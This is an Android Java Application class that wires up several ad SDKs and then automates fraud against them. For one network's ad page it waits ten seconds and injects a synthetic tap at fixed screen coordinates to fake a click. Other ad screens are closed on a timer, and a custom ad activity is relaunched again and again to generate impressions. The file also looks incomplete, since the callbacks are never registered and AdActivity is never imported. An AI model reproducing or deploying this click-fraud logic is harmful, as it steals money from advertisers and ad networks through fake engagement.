package com.example.demo;

import android.app.Activity;
import android.app.Application;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.SystemClock;
import android.text.TextUtils;
import android.view.MotionEvent;

import com.baidu.mobads.AppActivity;
import com.helen.andbase.application.HBaseApplication;
import com.qhad.ads.sdk.adcore.QhAdActivity;
import com.qhad.ads.sdk.adcore.Qhad;
import com.qq.e.ads.ADActivity;
import com.youxiaoad.ssp.poster.cp.CpAdActivity;
import com.youxiaoad.ssp.poster.ui.AdDetailsActivity;

import th.ds.wa.AdManager;


/**
 * Created by Helen on 2015/10/21.
 *
 */
public class DemoApplication extends HBaseApplication implements Application.ActivityLifecycleCallbacks{
    private Handler mHandler = new Handler();
    private Application instance;
    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        initAd();
    }

    private void initAd() {
        if(!TextUtils.isEmpty(BuildConfig.APP_ID_360)){
            Qhad.setLogSwitch(this,BuildConfig.DEBUG);
        }
        if(!TextUtils.isEmpty(BuildConfig.APP_ID_YM)){
            AdManager.getInstance(this).init(BuildConfig.APP_ID_YM, BuildConfig.SECRET_ID_YM, false, BuildConfig.DEBUG);
        }
    }

    @Override
    protected boolean isAuthorityCheck() {
        return false;
    }

    @Override
    public void onActivityCreated(Activity activity, Bundle savedInstanceState) {

    }

    @Override
    public void onActivityStarted(final Activity activity) {
        if(activity instanceof ADActivity || activity instanceof QhAdActivity || activity instanceof CpAdActivity || activity instanceof AdDetailsActivity){
            isHandle = true;
            closeActivity(activity);
        }else if(activity instanceof com.baidu.mobads.AppActivity){
            isHandle = true;
            mHandler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    AppActivity appActivity = (AppActivity)activity;
                    long downTime = SystemClock.uptimeMillis();
                    MotionEvent downEvent = MotionEvent.obtain(downTime,downTime,MotionEvent.ACTION_DOWN,231.67822f,235.70493f,0);
                    appActivity.curWebview.dispatchTouchEvent(downEvent);
                    long upTime = SystemClock.uptimeMillis();
                    MotionEvent upEvent = MotionEvent.obtain(upTime,upTime,MotionEvent.ACTION_UP,231.67822f,235.70493f,0);
                    appActivity.curWebview.dispatchTouchEvent(upEvent);
                    closeActivity(activity);
                }
            },10*1000);

        }
    }

    @Override
    public void onActivityResumed(Activity activity) {
        if(activity instanceof AdActivity){
            isHandle = false;
        }
    }

    @Override
    public void onActivityPaused(Activity activity) {
        if (activity instanceof AdActivity){
            restartAdActivity();
        }
    }

    @Override
    public void onActivityStopped(Activity activity) {

    }

    @Override
    public void onActivitySaveInstanceState(Activity activity, Bundle outState) {

    }

    @Override
    public void onActivityDestroyed(Activity activity) {
        if(activity instanceof AdActivity){
            mHandler.removeCallbacks(mRestartActivityRunnable);
            if(mCloseActivityRunnable != null) {
                mHandler.removeCallbacks(mCloseActivityRunnable);
            }
        }
    }


    private static final int TIME_COUNT = 5000;
    //关闭activity
    private void closeActivity(final Activity activity){
        if(mCloseActivityRunnable != null) {
            mHandler.removeCallbacks(mCloseActivityRunnable);
        }
        mCloseActivityRunnable = new CloseActivityRunnable(activity);
        mHandler.postDelayed(mCloseActivityRunnable,TIME_COUNT);
    }

    private CloseActivityRunnable mCloseActivityRunnable;

    private class CloseActivityRunnable implements Runnable{
        Activity activity;
        CloseActivityRunnable(Activity activity){
            this.activity = activity;
        }
        @Override
        public void run() {
            activity.finish();
        }
    }


    //重启AdActivity
    private boolean isHandle = false;
    private void restartAdActivity(){
        mHandler.removeCallbacks(mRestartActivityRunnable);
        mHandler.postDelayed(mRestartActivityRunnable,TIME_COUNT);
    }
    private RestartActivityRunnable mRestartActivityRunnable = new RestartActivityRunnable();
    private class RestartActivityRunnable implements Runnable{
        @Override
        public void run() {
            if(!isHandle){
                Intent i = new Intent(instance, AdActivity.class);
                i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                instance.startActivity(i);
            }
        }
    }
}
